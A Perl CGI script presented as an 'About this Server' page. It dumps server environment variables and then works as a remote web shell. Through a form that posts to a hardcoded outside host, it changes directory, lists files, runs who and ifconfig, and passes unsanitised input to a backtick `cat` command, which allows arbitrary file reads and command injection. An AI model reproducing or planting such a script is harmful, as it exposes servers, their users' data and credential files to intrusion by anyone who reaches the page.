#!/usr/bin/perl

# use 5.004;
# use CGI gw(:standart);
print "Content-type: text/html\n\n";
print "<html><head><title>About this Server</title></head>\n";
print " <BODY BGcolor=#FFFFFF TEXT=#003399 LINK=#009999 VLINK=#009999>  <base target=main><br>About this Server <hr><br><font size=3> \n" ;

# print  h1("Use use");
print  "<center><b>the time is now ".`date`."</b></center><br>";

($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst)=localtime(time) ;
$date = " hour-".$hour." min-".$min."sec-".$sec." mday-".$mday." mon-".$mon." year-".$year." wday-".$wday." yday-".$yday." isdst-".$isdst."-" ;

print "<table cellspacing=7 ><tr><td><font size=-1>";
print "SERVER_NAME :                    ",   $ENV{ 'SERVER_NAME' },  ".<br>\n";
print "SERVER_PORT :                    ",   $ENV{ 'SERVER_PORT' },  ".<br>\n";
print "SERVER_SOFTWARE :                ",   $ENV{ 'SERVER_SOFTWARE' },  ".<br>\n";
print "SERVER_PROTOCOL :                ",   $ENV{ 'SERVER_PROTOCOL' },  ".<br>\n";
print "CONTENT_TYPE  :                  ",   $ENV{ 'CONTENT_TYPE' },  ".<br>\n";
print "CGI  Revision SERVER_INTERFACE : ",   $ENV{ 'SERVER_INTERFACE' },  ".<br>\n";
print "URL from HTTP_REFERER :                       ",   $ENV{ 'HTTP_REFERER' },  ".<br>\n";
print "</td><td><font size=-1>";
print "SCRIPT_NAME :            ",   $ENV{ 'SCRIPT_NAME' },  ".<br>\n";
print "REQUEST_METHOD :         ",   $ENV{ 'REQUEST_METHOD' },  ".<br>\n";
print "QUERY_STRING :           ",   $ENV{ 'QUERY_STRING' },  ".<br>\n";
print "REMOTE_ADDR :            ",   $ENV{ 'REMOTE_ADDR' },  ".<br>\n";
print "REMOTE_HOST :            ",   $ENV{ 'REMOTE_HOST' },  ".<br>\n";
print "REMOTE_IDENT :           ",   $ENV{ 'REMOTE_IDENT' },  ".<br>\n";
print "REMOTE_USER :            ",   $ENV{ 'REMOTE_USER' },  ".<br>\n";
print "</td></tr></table>";
print "HTTP_USER_AGENT :                ",   $ENV{ 'HTTP_USER_AGENT' },  ".<br>\n";
print  "<center><b>",$date ,"</b></center><br>"  ;

#-----------------------------7d03c0d624
#     $c_end = '\015';
$c_end = '\014';
print "<HR><br>\n";
read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
   	 print "<pre>  ".$buffer. "</pre>\n" ;
	print "<HR><br>\n";
	
$del=substr($buffer, 0, 40 );	
@pairs = split(/$del/, $buffer);  #&  $c_end
foreach $pair (@pairs) 
	    {
		$pair =~ s/$c_end$c_end/====================/ig ;
   	 print " pair <pre> ".$pair. "</pre><br>\n" ;
	print "<HR><br>\n";
	     ($name, $value) = split(/=/, $pair);
#	     $FORM{$name} = $value;
#   	 print "==>  ".$name." !!! ".$value. "<br>\n" ;
# 	 print "<HR><br>\n";
	    }
# print "<!  $file_enter = $file_local = $tip = $key_words ><br>\n" ;


print "<HR><br>\n";
# -----------------------------------------------------
read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});

@pairs = split(/&/, $buffer);

foreach $pair (@pairs) 
{
   ($name, $value) = split(/=/, $pair);

   $value =~ tr/+/ /;
   $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
   $value =~ s/<!--(.|\n)*-->//g;

   $FORM{$name} = $value;
#   print "<!  ".$name." - ".$FORM{$name}. "><br>\n" ;
}

chdir $FORM{'cd_p'};

$ipwd=`pwd`;
print "<form method=POST target=\"_self\" action=\"http://walks.ru/cgi-bin/lt.pl\"> ";
print "ls:</B> <input type=text name=cd_p size=50 value=$ipwd > ";
print "pr:</B> <input type=text name=pr_p size=30  > ";
print "<input type=submit value=\"!\"> ";
print "<input type=hidden name=real_msg  value=\"real_msg\"> ";


print "<blockquote>";
print "<PRE>";
foreach $_ (`ls -l`)
	{
	 print "<b>$_</b> ";
	}
print "</PRE>";
print "</blockquote>";

print "<HR><br>\n";
print "who \n";
print "<blockquote>";
foreach $_ (`who`)
	{
	 ( $who, $here, $when ) = /(\S+)\s+(\S+)\s+(.*)/;
	 print "<b>$who</b> on <b>$here</b> at $when <br>\n";
	}
print "</blockquote>";

print "<HR><br>\n";
print "ifconfig \n";
print "<PRE>";
foreach $_ (`ifconfig`)
	{
	 print "$_";
	}
print "</PRE>";



print "<HR><br>\n";
print "<blockquote>";
$pr_p= "cat ".$FORM{'pr_p'} ;
print "<PRE>";
foreach $_ (`$pr_p`)
	{
	 s/</&lt;/ig ;
	 s/>/&gt;/ig ;
	 print "$_";
	}
print "</PRE>";
print "</blockquote>";

print "<HR></body></html>\n";
  
exit(0);


